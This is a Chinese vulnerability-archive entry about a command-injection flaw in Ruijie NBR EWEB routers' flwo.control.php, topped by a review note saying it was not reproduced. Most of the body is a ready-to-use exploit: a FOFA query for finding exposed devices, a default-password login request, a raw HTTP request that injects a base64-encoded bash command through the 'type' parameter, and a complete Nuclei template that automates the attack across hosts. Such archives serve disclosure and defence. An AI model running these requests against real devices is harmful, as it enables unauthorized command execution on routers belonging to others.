---
source: "wy876 漏洞文库"
id: "vw-d601e0990756926b8e4a6c19"
entity_id: "ve-d601e0990756926b8e4a6c19"
schema_version: "1"
title: "锐捷 EWEB flwo.control.php 命令执行线索"
product: "Ruijie NBR EWEB"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "先admin/admin?登录取Cookie，固件未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7EWEBflwo.contro%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/wqfe5713gy2pdu2v"
source_status: "recorded"
previous_fofa_unverified: "app.name=="
fofa: "title=\"锐捷网络-EWEB网管系统\""
---

# 锐捷 EWEB flwo.control.php 命令执行线索

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie NBR EWEB
- 本文讨论：flwo.control.php getFlowGroup type命令注入
- 版本、权限与配置前提：先admin/admin?登录取Cookie，固件未知
- 资料类型：后台链式PoC/Nuclei；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 标题flwo.contro与实际flwo.control.php不一致，不能擅自纠成flow而应核实际文件名
- Nuclei后续请求无Cookie也无显式cookie-reuse，登录态依赖工具版本需明确
- 嵌套{{filename}}在base64字符串中是否展开未说明；固定HelloWorld可旧文件误报
- 删除/写文件副作用，未清理；Bsae64笔误与fofa字段截断
- 已落实的文本修订：“Bsae64”改为“Base64”；残缺指纹退出可执行索引并保留原值；标题与正文证据对齐。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 登录是否认证绕过/默认口令、实际文件名/固件待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
锐捷EWEB flwo.contro存在远程命令执行漏洞

# 二、影响版本
+ 锐捷NBR路由器

# 三、资产测绘
+ hunter`app.name=="Ruijie 锐捷 EWEB"`
+ fofa`title="锐捷网络-EWEB网管系统"`
+ 登录页面

# 四、漏洞复现
 先发送数据包，获取cookie  

```http
POST /ddi/server/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 

username=admin&password=admin?
```


 使用获取cookie执行命令  

```http
cm0gLXJmIC4uL2lrbTEyMy50eHQgJiYgZWNobyBIZWxsb1dvcmxkID4gLi4vaWttMTIzLnR4dCAyPiYx 
Base64解码
rm -rf ../ikm123.txt && echo HelloWorld > ../ikm123.txt 2>&1
```

```http
POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 160
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=e3t2n743strq8lu1anqod3bhu6;
Accept-Encoding: gzip

type=%7Cbash+-c+%27echo+cm0gLXJmIC4uL2lrbTEyMy50eHQgJiYgZWNobyBIZWxsb1dvcmxkID4gLi4vaWttMTIzLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
```


 3、命令执行成功 

```http
/ikm123.txt
```


## 五、 Nuclei
```http
id: RJEWEB-flwo-contro-RCE

info:
  name: 锐捷 EWEB-RCE-flwo.contro
  author: haoguoguo
  severity: high
  metadata: 
    fofa-query: title="锐捷网络-EWEB网管系统"
variables:
  filename: "{{to_lower(rand_base(5))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      - |
        POST /ddi/server/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 

        username=admin&password=admin?

      - |
        POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Connection: close
        Content-Length: 160
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip

        type=%7Cbash+-c+%27echo+{{base64("rm -rf ../{{filename}}.txt && echo HelloWorld > ../{{filename}}.txt 2>&1")}}+%7C+base64+-d+%7C+bash+%26%26+exit+0%27

      - |
        GET /{{filename}}.txt HTTP/1.1
        Host:{{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 0


    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"HelloWorld")
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wqfe5713gy2pdu2v>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
